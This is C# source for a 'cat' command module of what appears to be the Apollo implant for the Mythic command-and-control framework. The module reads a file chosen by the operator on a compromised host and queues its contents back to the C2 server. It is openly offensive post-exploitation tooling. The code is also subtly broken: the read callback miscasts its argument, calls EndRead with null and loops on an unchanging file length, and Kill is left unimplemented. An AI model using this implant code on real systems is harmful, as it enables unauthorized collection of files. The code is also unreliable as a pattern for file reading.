using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using ApolloInterop.Classes.Collections;
using System.IO;

namespace Tasks
{
    public class cat : Tasking
    {
        [DataContract]
        internal struct CatParameters
        {
            [DataMember(Name = "path")]
            public string Path;
        }

        private AutoResetEvent _complete = new AutoResetEvent(false);
        private AutoResetEvent _fileRead = new AutoResetEvent(false);
        private bool _completed = false;
        private ThreadSafeList<string> _contents = new ThreadSafeList<string>();
        private Action _flushContents;
        private WaitHandle[] _timers;
        private byte[] _buffer = new byte[4096];

        public cat(IAgent agent, Task task) : base(agent, task)
        {
            _timers = new WaitHandle[]
            {
                _complete,
                _cancellationToken.Token.WaitHandle
            };
            _flushContents = new Action(() =>
            {
                string output = "";
                while(!_cancellationToken.IsCancellationRequested && !_completed)
                {
                    WaitHandle.WaitAny(_timers, 1000);

                    output = string.Join("", _contents.Flush());
                    SendMessageToMythic(output);
                }
                output = string.Join("", _contents.Flush());
                SendMessageToMythic(output);
            });
        }

        private void SendMessageToMythic(string msg)
        {
            if (!string.IsNullOrEmpty(msg))
            {
                TaskResponse resp = CreateTaskResponse(
                    msg,
                    false,
                    "");
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
        }

        private void FileReadCallback(IAsyncResult result)
        {
            FileStream fs = (FileStream)result;
            fs.EndRead(null);
            try
            {
                _contents.Add(System.Text.Encoding.UTF8.GetString(_buffer));
                if (fs.Length > 0)
                {
                    _buffer = fs.Length > 4096 ? new byte[4096] : new byte[fs.Length];
                    fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
                } else
                {
                    _fileRead.Set();
                }
            } catch (Exception ex)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    $"Exception hit while reading file: {ex.Message}", true, "error"));
                _fileRead.Set();
            }
        }

        public override void Kill()
        {
            throw new NotImplementedException();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                CatParameters parameters = _jsonSerializer.Deserialize<CatParameters>(_data.Parameters);
                if (!File.Exists(parameters.Path))
                {
                    resp = CreateTaskResponse($"File {parameters.Path} does not exist.", true, "error");
                } else
                {
                    FileStream fs = null;
                    try
                    {
                        fs = File.OpenRead(parameters.Path);
                        if (fs.Length < _buffer.Length)
                        {
                            _buffer = new byte[fs.Length];
                        }
                        fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
                        WaitHandle.WaitAny(new WaitHandle[]
                        {
                            _fileRead,
                            _cancellationToken.Token.WaitHandle
                        });
                        _completed = true;
                        _complete.Set();
                        resp = CreateTaskResponse("", true);
                    } catch (UnauthorizedAccessException ex)
                    {
                        resp = CreateTaskResponse("Access denied.", true, "error");
                    } catch (Exception ex)
                    {
                        resp = CreateTaskResponse($"Unable to read {parameters.Path}: {ex.Message}", true, "error");
                    }
                }
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}
